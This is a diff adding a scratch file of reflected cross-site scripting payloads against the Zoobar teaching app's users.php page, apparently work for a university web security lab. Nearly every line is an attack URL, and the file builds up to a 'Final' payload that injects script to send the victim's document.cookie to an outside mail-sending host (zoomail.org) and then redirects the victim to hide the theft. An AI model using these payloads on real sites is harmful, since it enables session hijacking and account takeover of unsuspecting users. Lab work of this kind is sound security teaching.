@@ -1,0 +1,21 @@
+users.php"\</script\>
+# tests
+http://zoobar.org/users.php?user=\"\>\<script\>javascript:void((new Image()).src='http://zoomail.org/sendmail.php?'+'&netid=yourieng6username'+'&payload=xyz'+'&random='+Math.random());\</script\>
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Evoid%28%28new%20Image%28%29%29.src=%27http://zoomail.org/sendmail.php?%27+%27&netid=yourieng6username%27+%27&payload=xyz%27+%27&random=%27+Math.random%28%29;\%3C/script\%3E
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Ejavascript:void%28%28new%20Image%28%29%28new%20Image%28%29%29.src=%27http://zoomail.org/sendmail.php?&netid=yourieng6username&payload=xyz&random=%27+Math.random%28%29%29%29;\%3C/script\%3E
+<script>(alert('test'+Math.random()))</script>
+http://zoomail.org/sendmail.php?netid=yourieng6username&payload=xyz&send_submit=Send+Email
+
+# Prints test+math
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3E%28alert%28%27test%27%2BMath.random%28%29%29%29\%3C/script\%3E
+<script\>javascript:void(alert('test'%2BMath.random()))\</script\>
+
+# Sends email
+<script\>javascript:void((new Image()).src='http://zoomail.org/sendmail.php?%26netid=yourieng6username%26payload=xyz'%2B'%26random='%2BMath.random());\</script\>
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Ejavascript:void%28%28new%20Image%28%29%29.src=%27http://zoomail.org/sendmail.php?%26netid=yourieng6username%26payload=xyz%27%2B%27%26random=%27%2BMath.random%28%29%29;\%3C/script\%3E
+
+http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Ejavascript:void%28%28new%20Image%28%29%29.src=%27http://zoomail.org/sendmail.php?%27%2B%27&netid=yourieng6username%27%2B%27&payload=xyz%27%2B%27&random=%27%2BMath.random%28%29%29;\%3C/script\%3E
+
+# Final (combine into one line)
+http://zoobar.org/users.php?user=\"\>\<script\>javascript:void((new Image()).src='http://zoomail.org/sendmail.php?%26netid=yourieng6username%26payload='%2Bdocument.cookie%2B'%26random='%2BMath.random());window.location="http://zoobar.org/
+users.php"\</script\>
